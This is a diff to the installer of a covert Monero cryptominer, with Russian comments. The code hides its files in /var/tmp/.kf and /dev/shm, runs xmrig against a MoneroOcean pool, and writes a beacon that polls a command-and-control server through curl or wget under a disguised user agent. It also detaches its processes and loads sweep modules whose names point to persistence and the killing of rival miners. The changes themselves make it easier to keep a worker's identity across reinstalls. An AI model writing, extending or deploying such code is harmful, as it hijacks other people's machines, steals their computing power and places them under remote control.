@@ -22,7 +22,6 @@
 
 set -u
 C2="${1:-}"
-WID="${2:-x}"
 CP2="${KF_CP2:-${C2:-}}"
 NICE="${KF_NICE:-19}"
 POOL="${KF_POOL:-gulf.moneroocean.stream:443}"
@@ -74,6 +73,18 @@ chmod 700 "$D" "$S" 2>/dev/null || true
 
 # Один WID работает только в preferred root: D=$S, var/tmp=$S, tmp=$S.
 PREF_ROOT=$(kf_preferred_root)
+WID="${2:-}"
+# 20.11 фикс "WID=x": при переустановке без аргумента наследуем сохранённый id
+# (иначе c.json живого воркера перекрашивался в rig-id x и пул терял воркера).
+if [ -z "$WID" ]; then
+  for _src in "$PREF_ROOT/id" "$D/id" /data/.kf/id /var/tmp/.kf/id; do
+    [ -s "$_src" ] || continue
+    _old=$(tr -d ' \r\n' < "$_src" 2>/dev/null)
+    case "$_old" in x|"") continue ;; esac
+    WID="$_old"; break
+  done
+fi
+[ -n "$WID" ] || WID=x
 if ! kf_arbitrate_root "$D" "$WID" "$PREF_ROOT"; then
   kf_log "WID $WID: выход — предпочтительный экземпляр $PREF_ROOT"
   exit 0
@@ -323,7 +334,7 @@ chmod 600 "$D/flags" 2>/dev/null
 # --- бекон: поллинг C2 -------------------------------------------------------
 kf_write "$D/beacon.sh" <<'BS'
 #!/bin/sh
-D=/var/tmp/.kf
+D="${KF_ROOT:-/var/tmp/.kf}"
 ID="$1"; shift
 get(){ if command -v curl >/dev/null 2>&1; then curl -fsS -m 15 -A "kf9" "$1" 2>/dev/null; elif command -v wget >/dev/null 2>&1; then wget -q -T 15 -U kf9 -O - "$1" 2>/dev/null; else return 1; fi; }
 post(){
@@ -345,7 +356,7 @@ BS
 
 kf_write "$D/loop.sh" <<'LP'
 #!/bin/sh
-D=/var/tmp/.kf
+D="${KF_ROOT:-/var/tmp/.kf}"
 ID="$1"; C2="$2"
 while :; do
   # адрес перечитываем каждый тик: смена C2 подхватывается без перезапуска
@@ -370,7 +381,7 @@ fi
 #    sleep-петель на слабых хостах, но потеря одного не роняет картину.
 kf_write "$D/svc.sh" <<'SV'
 #!/bin/sh
-D=/var/tmp/.kf; S=/dev/shm/.kf; R="${1:-m}"
+D="${KF_ROOT:-/var/tmp/.kf}"; S=/dev/shm/.kf; R="${1:-m}"
 alm(){ for p in /proc/[0-9]*; do c=$(tr '\0' ' ' 2>/dev/null <"$p/cmdline"); case "$c" in *"$1"*) return 0;; esac; done; return 1; }
 detach(){ if command -v setsid >/dev/null 2>&1; then setsid "$@" </dev/null >/dev/null 2>&1 & elif command -v nohup >/dev/null 2>&1; then nohup "$@" </dev/null >/dev/null 2>&1 & else "$@" </dev/null >/dev/null 2>&1 & fi; }
 _bin(){ a=$(cat "$D/.alias" 2>/dev/null); if [ -n "$a" ] && [ -x "$a" ]; then printf '%s' "$a"; return; fi; [ -x "$D/xmrig" ] && printf '%s' "$D/xmrig"; }
@@ -421,7 +432,7 @@ SV
 # --- зачистка: цикл ----------------------------------------------------------
 kf_write "$D/sweep.sh" <<'SW'
 #!/bin/sh
-D=/var/tmp/.kf
+D="${KF_ROOT:-/var/tmp/.kf}"
 for m in 00-common 10-exclude 20-sweep 25-patch 26-antiunicorn 30-single 40-transport 50-cron 55-immortal 60-harden 70-fetch; do
   [ -f "$D/$m.sh" ] && . "$D/$m.sh"
 done
